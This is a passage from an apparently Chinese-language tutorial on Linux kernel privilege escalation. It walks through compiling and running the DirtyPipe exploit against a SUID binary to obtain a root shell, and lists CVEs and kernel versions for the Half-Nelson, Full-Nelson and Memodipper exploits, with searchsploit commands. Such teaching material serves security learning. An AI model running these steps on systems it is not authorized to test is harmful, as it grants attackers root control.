<p>现在受害者身上有了漏洞利用程序，我们就不需要更改该文件的权限了，因为它还不是可执行文件，但我们仍然需要编译它。</p>
<p>在我们运行 gcc 及其基本语法之前，我们应该先检查漏洞的注释，看看是否有关于如何编译或执行此漏洞的具体说明。为此，我们可以使用 head 命令检查前 50 行左右，看看它说了什么。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">head -50 dirty_pipe.c</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155354939-967118261-d18f623fafe4001b0e91e826ffeaef50.png" width="705" height="527" class="img_ev3q"></p>
<p>这里我们可以看到如何使用漏洞的示例；但是，没有关于如何编译的信息。这个示例还不错，但不是很好。</p>
<p>由于没有编译此漏洞的特殊说明，我们可以假设它可以使用基本的<strong>gcc</strong>语法进行编译。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">gcc dirty_pipe.c -o dirty_pipe</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155353459-491511328-0043b97846fd89d22878e3ade16916ff.png" width="672" height="127" class="img_ev3q"></p>
<p>编译漏洞时，我们没有收到任何错误，这表明漏洞已成功编译。</p>
<p>在我们继续尝试按照示例进行操作之前，试着执行二进制文件，看看它是怎么说的，可能会更容易一些。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">./dirty_pipe</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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" width="346" height="46" class="img_ev3q"></p>
<p>这里的输出告诉我们，我们需要做的就是提供 SUID 二进制文件的路径。此外，如果我们进一步向下滚动，我们可以看到有关此漏洞利用的更多信息。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155353425-68377139-43ae53abd21adb244fcb96cf26c8ae5b.png" width="485" height="196" class="img_ev3q"></p>
<p>这告诉我们，漏洞会将“sh”复制到 /tmp/sh 中，然后赋予其 SUID 权限 (4755)。让我们使用 su 之类的任意 SUID 二进制文件来测试它。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">./dirty_pipe /usr/bin/su</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155353848-99759591-2911d39ffd4af751e6076cf1d9b59d8f.png" width="590" height="225" class="img_ev3q"></p>
<p>BOOM！该漏洞利用有效，我们可以看到它在 /tmp 文件夹中创建了一个 SUID &#x27;sh&#x27; 二进制文件，该漏洞利用程序“放入”其中，以向我们提供 root shell！</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="33在其他机器编译内核漏洞"><strong><div id="id3.3">3.3、在其他机器编译内核漏洞</div></strong><a href="#33在其他机器编译内核漏洞" class="hash-link" aria-label="33在其他机器编译内核漏洞的直接链接" title="33在其他机器编译内核漏洞的直接链接">​</a></h4>
<p>如前所述，还有一些其他方法可以编译内核漏洞，当受害计算机未安装gcc时了解这些方法很有用。</p>
<p>在这种情况下，我们需要在另一台机器上编译漏洞利用程序，然后将其传输给受害者。一般来说，这可以通过两种方式完成，要么从我们的攻击者机器上，要么通过创建一个与受害者具有相同或非常接近相同内核的新虚拟机。</p>
<p>对于这些情况，我们将按照直接在受害者上编译漏洞时所做的操作进行操作。这将包括检查编译和执行指令的注释，然后编译漏洞利用程序。接下来，我们会将漏洞转移到受害者身上，然后授予其执行权限，然后弹出它并获取 root shell。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="4多种内核漏洞利用示例"><strong><div id="id4">4、多种内核漏洞利用示例</div></strong><a href="#4多种内核漏洞利用示例" class="hash-link" aria-label="4多种内核漏洞利用示例的直接链接" title="4多种内核漏洞利用示例的直接链接">​</a></h2>
<p>正如本文开头提到的，我们将回顾 6 个内核漏洞。我们已经探索了<strong>DirtyPipe</strong>，所以现在让我们看一下更多的内容，包括 half-nelson / full-nelson、memodipper、DirtyCow / DirtyCow2 和 eBPF verifier。</p>
<blockquote>
<p>我选择这些特定漏洞的原因，是因为它们涵盖了 2010 年至今的几乎所有内核。</p>
</blockquote>
<p>对于下面的所有示例，我们假设受害者安装了<strong>gcc</strong>。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="41half-nelsonfull-nelson-示例"><strong><div id="id4.1">4.1、Half-Nelson/Full-Nelson 示例</div></strong><a href="#41half-nelsonfull-nelson-示例" class="hash-link" aria-label="41half-nelsonfull-nelson-示例的直接链接" title="41half-nelsonfull-nelson-示例的直接链接">​</a></h4>
<p>CVE：2010-4073 – Half-Nelson</p>
<ul>
<li>Kernels：2.6.0、2.6.1、2.6.2、2.6.3、2.6.4、2.6.5、2.6.6、2.6.7、2.6.8、2.6.9、2.6.10、2.6.11、 2.6.12、2.6.13、2.6.14、2.6.15、2.6.16、2.6.17、2.6.18、2.6.19、2.6.20、2.6.21、2.6.22、2.6.23、2.6。 24、2.6.25、2.6.26、2.6.27、2.6.28、2.6.29、2.6.30、2.6.31、2.6.32、2.6.33、2.6.34、2.6.35、2.6.36</li>
</ul>
<p>CVE：2010-4258 – Full-Nelson</p>
<ul>
<li>Kernels：2.6.31、2.6.32、2.6.35、2.6.37</li>
</ul>
<p>使用searchsploit查找漏洞，如下所示：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">searchsploit nelson</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155353267-1478691952-f71f67c80e265773dab73eb2de529cad.png" width="1020" height="139" class="img_ev3q"></p>
<p>获取两者的副本，或者您想要使用的任何一个，然后再次使用<strong>head</strong>命令检查注释。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155353625-834345953-cd8d6a4604989df354299dc4cf942647.png" width="440" height="176" class="img_ev3q"></p>
<p>看起来很简单，现在我们可以将其传输到我们的受害者机器，编译它，然后获取我们的 root shell。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240604155353406-76493109-9a09fa6cf569be191d7ac5bf705b00ac.png" width="407" height="201" class="img_ev3q"></p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="42memodipper-示例"><strong><div id="id4.2">4.2、Memodipper 示例</div></strong><a href="#42memodipper-示例" class="hash-link" aria-label="42memodipper-示例的直接链接" title="42memodipper-示例的直接链接">​</a></h4>
<p>CVE：2012-0056 – Memodipper</p>
<ul>
<li>Kernels：2.6.39、3.0.0、3.0.1、3.0.2、3.0.3、3.0.4、3.0.5、3.0.6、3.1.0</li>
</ul>
<p>使用searchsploit查找漏洞，如下所示：</p>
